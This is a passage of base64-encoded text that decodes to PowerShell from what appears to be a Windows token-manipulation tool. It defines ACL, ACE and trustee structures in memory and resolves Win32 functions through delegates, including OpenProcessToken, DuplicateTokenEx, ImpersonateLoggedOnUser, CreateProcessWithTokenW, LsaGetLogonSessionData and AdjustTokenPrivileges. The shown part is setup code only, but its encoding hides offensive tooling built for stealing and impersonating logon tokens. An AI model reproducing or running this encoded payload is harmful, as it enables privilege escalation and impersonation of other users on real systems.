N0ZW0uVmFsdWVUeXBlXSkKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWNsUmV2aXNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NiejEnLCBbQnl0ZV0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FjbFNpemUnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWNlQ291bnQnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2J6MicsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJEFDTCA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCiAgICAjU3RydWN0IEFDRV9IRUFERVIKICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdBQ0NFU1NfQUxMT1dFRF9BQ0UnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdKQogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdIZWFkZXInLCAkQUNFX0hFQURFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFzaycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaWRTdGFydCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJEFDQ0VTU19BTExPV0VEX0FDRSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCiAgICAjU3RydWN0IFRSVVNURUUKICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdUUlVTVEVFJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSkKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgncE11bHRpcGxlVHJ1c3RlZScsIFtJbnRQdHJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNdWx0aXBsZVRydXN0ZWVPcGVyYXRpb24nLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVHJ1c3RlZUZvcm0nLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVHJ1c3RlZVR5cGUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgncHRzdHJOYW1lJywgW0ludFB0cl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVFJVU1RFRSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCiAgICAjU3RydWN0IEVYUExJQ0lUX0FDQ0VTUwogICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0VYUExJQ0lUX0FDQ0VTUycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0pCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2dyZkFjY2Vzc1Blcm1pc3Npb25zJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2dyZkFjY2Vzc01vZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZ3JmSW5oZXJpdGFuY2UnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVHJ1c3RlZScsICRUUlVTVEVFLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJEVYUExJQ0lUX0FDQ0VTUyA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgI1dpbjMyRnVuY3Rpb25zCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2VzcwoJJE9wZW5Qcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1VJbnQzMl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKCSRPcGVuUHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRPcGVuUHJvY2Vzc0FkZHIsICRPcGVuUHJvY2Vzc0RlbGVnYXRlKQoKICAgICRPcGVuUHJvY2Vzc1Rva2VuQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgT3BlblByb2Nlc3NUb2tlbgoJJE9wZW5Qcm9jZXNzVG9rZW5EZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKCSRPcGVuUHJvY2Vzc1Rva2VuID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzVG9rZW5BZGRyLCAkT3BlblByb2Nlc3NUb2tlbkRlbGVnYXRlKSAgICAKCiAgICAkR2V0VG9rZW5JbmZvcm1hdGlvbkFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgYWR2YXBpMzIuZGxsIEdldFRva2VuSW5mb3JtYXRpb24KCSRHZXRUb2tlbkluZm9ybWF0aW9uRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sICRUT0tFTl9JTkZPUk1BVElPTl9DTEFTUywgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCgkkR2V0VG9rZW5JbmZvcm1hdGlvbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRUb2tlbkluZm9ybWF0aW9uQWRkciwgJEdldFRva2VuSW5mb3JtYXRpb25EZWxlZ2F0ZSkgICAgCgogICAgJFNldFRocmVhZFRva2VuQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgU2V0VGhyZWFkVG9rZW4KCSRTZXRUaHJlYWRUb2tlbkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSkgKFtCb29sXSkKCSRTZXRUaHJlYWRUb2tlbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRTZXRUaHJlYWRUb2tlbkFkZHIsICRTZXRUaHJlYWRUb2tlbkRlbGVnYXRlKSAgICAKCiAgICAkSW1wZXJzb25hdGVMb2dnZWRPblVzZXJBZGRyID0gR2V0LVByb2NBZGRyZXNzIGFkdmFwaTMyLmRsbCBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcgoJJEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0pIChbQm9vbF0pCgkkSW1wZXJzb25hdGVMb2dnZWRPblVzZXIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSW1wZXJzb25hdGVMb2dnZWRPblVzZXJBZGRyLCAkSW1wZXJzb25hdGVMb2dnZWRPblVzZXJEZWxlZ2F0ZSkKCiAgICAkUmV2ZXJ0VG9TZWxmQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgUmV2ZXJ0VG9TZWxmCgkkUmV2ZXJ0VG9TZWxmRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0Jvb2xdKQoJJFJldmVydFRvU2VsZiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRSZXZlcnRUb1NlbGZBZGRyLCAkUmV2ZXJ0VG9TZWxmRGVsZWdhdGUpCgogICAgJExzYUdldExvZ29uU2Vzc2lvbkRhdGFBZGRyID0gR2V0LVByb2NBZGRyZXNzIHNlY3VyMzIuZGxsIExzYUdldExvZ29uU2Vzc2lvbkRhdGEKCSRMc2FHZXRMb2dvblNlc3Npb25EYXRhRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtVSW50MzJdKQoJJExzYUdldExvZ29uU2Vzc2lvbkRhdGEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTHNhR2V0TG9nb25TZXNzaW9uRGF0YUFkZHIsICRMc2FHZXRMb2dvblNlc3Npb25EYXRhRGVsZWdhdGUpCgogICAgJENyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcKCSRDcmVhdGVQcm9jZXNzV2l0aFRva2VuV0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbQm9vbF0pCgkkQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlbldBZGRyLCAkQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlbldEZWxlZ2F0ZSkKCiAgICAkbWVtc2V0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBtc3ZjcnQuZGxsIG1lbXNldAoJJG1lbXNldERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQoJJG1lbXNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRtZW1zZXRBZGRyLCAkbWVtc2V0RGVsZWdhdGUpCgogICAgJER1cGxpY2F0ZVRva2VuRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGFkdmFwaTMyLmRsbCBEdXBsaWNhdGVUb2tlbkV4CgkkRHVwbGljYXRlVG9rZW5FeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQoJJER1cGxpY2F0ZVRva2VuRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkRHVwbGljYXRlVG9rZW5FeEFkZHIsICREdXBsaWNhdGVUb2tlbkV4RGVsZWdhdGUpCgogICAgJExvb2t1cEFjY291bnRTaWRXQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgTG9va3VwQWNjb3VudFNpZFcKCSRMb29rdXBBY2NvdW50U2lkV0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludFB0cl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQoJJExvb2t1cEFjY291bnRTaWRXID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJExvb2t1cEFjY291bnRTaWRXQWRkciwgJExvb2t1cEFjY291bnRTaWRXRGVsZWdhdGUpCgogICAgJENsb3NlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ2xvc2VIYW5kbGUKCSRDbG9zZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQoJJENsb3NlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENsb3NlSGFuZGxlQWRkciwgJENsb3NlSGFuZGxlRGVsZWdhdGUpCgogICAgJExzYUZyZWVSZXR1cm5CdWZmZXJBZGRyID0gR2V0LVByb2NBZGRyZXNzIHNlY3VyMzIuZGxsIExzYUZyZWVSZXR1cm5CdWZmZXIKCSRMc2FGcmVlUmV0dXJuQnVmZmVyRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0pIChbVUludDMyXSkKCSRMc2FGcmVlUmV0dXJuQnVmZmVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJExzYUZyZWVSZXR1cm5CdWZmZXJBZGRyLCAkTHNhRnJlZVJldHVybkJ1ZmZlckRlbGVnYXRlKQoKICAgICRPcGVuVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblRocmVhZAoJJE9wZW5UaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQoJJE9wZW5UaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblRocmVhZEFkZHIsICRPcGVuVGhyZWFkRGVsZWdhdGUpCgogICAgJE9wZW5UaHJlYWRUb2tlbkFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgYWR2YXBpMzIuZGxsIE9wZW5UaHJlYWRUb2tlbgoJJE9wZW5UaHJlYWRUb2tlbkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0Jvb2xdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCgkkT3BlblRocmVhZFRva2VuID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5UaHJlYWRUb2tlbkFkZHIsICRPcGVuVGhyZWFkVG9rZW5EZWxlZ2F0ZSkKCiAgICAkQ3JlYXRlUHJvY2Vzc0FzVXNlcldBZGRyID0gR2V0LVByb2NBZGRyZXNzIGFkdmFwaTMyLmRsbCBDcmVhdGVQcm9jZXNzQXNVc2VyVwoJJENyZWF0ZVByb2Nlc3NBc1VzZXJXRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbQm9vbF0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSkgKFtCb29sXSkKCSRDcmVhdGVQcm9jZXNzQXNVc2VyVyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVQcm9jZXNzQXNVc2VyV0FkZHIsICRDcmVhdGVQcm9jZXNzQXNVc2VyV0RlbGVnYXRlKQoKICAgICRPcGVuV2luZG93U3RhdGlvbldBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgT3BlbldpbmRvd1N0YXRpb25XCiAgICAkT3BlbldpbmRvd1N0YXRpb25XRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICRPcGVuV2luZG93U3RhdGlvblcgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlbldpbmRvd1N0YXRpb25XQWRkciwgJE9wZW5XaW5kb3dTdGF0aW9uV0RlbGVnYXRlKQoKICAgICRPcGVuRGVza3RvcEFBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgT3BlbkRlc2t0b3BBCiAgICAkT3BlbkRlc2t0b3BBRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10sIFtVSW50MzJdLCBbQm9vbF0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAkT3BlbkRlc2t0b3BBID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5EZXNrdG9wQUFkZHIsICRPcGVuRGVza3RvcEFEZWxlZ2F0ZSkKCiAgICAkSW1wZXJzb25hdGVTZWxmQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgSW1wZXJzb25hdGVTZWxmCiAgICAkSW1wZXJzb25hdGVTZWxmRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludDMyXSkgKFtCb29sXSkKICAgICRJbXBlcnNvbmF0ZVNlbGYgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSW1wZXJzb25hdGVTZWxmQWRkciwgJEltcGVyc29uYXRlU2VsZkRlbGVnYXRlKQoKICAgICRMb29rdXBQcml2aWxlZ2VWYWx1ZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIExvb2t1cFByaXZpbGVnZVZhbHVlQQogICAgJExvb2t1cFByaXZpbGVnZVZhbHVlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10sIFtTdHJpbmddLCAkTFVJRC5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAkTG9va3VwUHJpdmlsZWdlVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTG9va3VwUHJpdmlsZWdlVmFsdWVBZGRyLCAkTG9va3VwUHJpdmlsZWdlVmFsdWVEZWxlZ2F0ZSkKCiAgICAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzCiAgICAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXSwgJFRPS0VOX1BSSVZJTEVHRVMuTWFrZUJ5UmVmVHlwZSgpLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgJEFkanVzdFRva2VuUHJpdmlsZWdlcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRBZGp1c3RUb2tlblByaXZpbGVnZXNBZGRyLCAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzRGVsZWdhdGUpCgogICAgJEdldEN1cnJlbnRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRDdXJyZW50VGhyZWFkCiAgICAkR2V0Q3VycmVudFRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQogICAgJEdldEN1cnJlbnRUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0Q3VycmVudFRocmVhZEFkZHIsICRHZXRDdXJyZW50VGhyZWFkRGVsZWdhdGUpCgogICAgJEdldFNlY3VyaXR5SW5mb0FkZHIgPSBHZXQtUHJvY0FkZHJlc3MgYWR2YXBpMzIuZGxsIEdldFNlY3VyaXR5SW5mbwogICAgJEdldFNlY3VyaXR5SW5mb0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW1VJbnQzMl0pCiAgICAkR2V0U2VjdXJpdHlJbmZvID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldFNlY3VyaXR5SW5mb0FkZHIsICRHZXRTZWN1cml0eUluZm9EZWxlZ2F0ZSkKCiAgICAkU2V0U2VjdXJpdHlJbmZvQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgU2V0U2VjdXJpdHlJbmZvCiAgICAkU2V0U2VjdXJpdHlJbmZvRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbVUludDMyXSkKICAgICRTZXRTZWN1cml0eUluZm8gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkU2V0U2VjdXJpdHlJbmZvQWRkciwgJFNldFNlY3VyaXR5SW5mb0RlbGVnYXRlKQoKICAgICRHZXRBY2VBZGRyID0gR2V0LVByb2NBZGRyZXNzIGFkdmFwaTMyLmRsbCBHZXRBY2UKICAgICRHZXRBY2VEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtJbnRQdHJdKQogICAgJEdldEFjZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRBY2VBZGRyLCAkR2V0QWNlRGVsZWdhdGUpCgogICAgJExvb2t1cEFjY291bnRTaWRXQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgTG9va3VwQWNjb3VudFNpZFcKICAgICRMb29rdXBBY2NvdW50U2lkV0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludFB0cl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgJExvb2t1cEFjY291bnRTaWRXID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJExvb2t1cEFjY291bnRTaWRXQWRkciwgJExvb2t1cEFjY291bnRTaWRXRGVsZWdhdGUpCgogICAgJEFkZEFjY2Vzc0FsbG93ZWRBY2VBZGRyID0gR2V0LVByb2NBZGRyZXNzIGFkdmFwaTMyLmRsbCBBZGRBY2Nlc3NBbGxvd2VkQWNlCiAgICAkQWRkQWNjZXNzQWxsb3dlZEFjZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgJEFkZEFjY2Vzc0FsbG93ZWRBY2UgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQWRkQWNjZXNzQWxsb3dlZEFjZUFkZHIsICRBZGRBY2Nlc3NBbGxvd2VkQWNlRGVsZWdhdGUpCgogICAgJENyZWF0ZVdlbGxLbm93blNpZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgYWR2YXBpMzIuZGxsIENyZWF0ZVdlbGxLbm93blNpZAogICAgJENyZWF0ZVdlbGxLbm93blNpZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICRDcmVhdGVXZWxsS25vd25TaWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlV2VsbEtub3duU2lkQWRkciwgJENyZWF0ZVdlbGxLbm93blNpZERlbGVnYXRlKQoKICAgICRTZXRFbnRyaWVzSW5BY2xXQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgU2V0RW50cmllc0luQWNsVwogICAgJFNldEVudHJpZXNJbkFjbFdEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgJEVYUExJQ0lUX0FDQ0VTUy5NYWtlQnlSZWZUeXBlKCksIFtJbnRQdHJdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbVUludDMyXSkKICAgICRT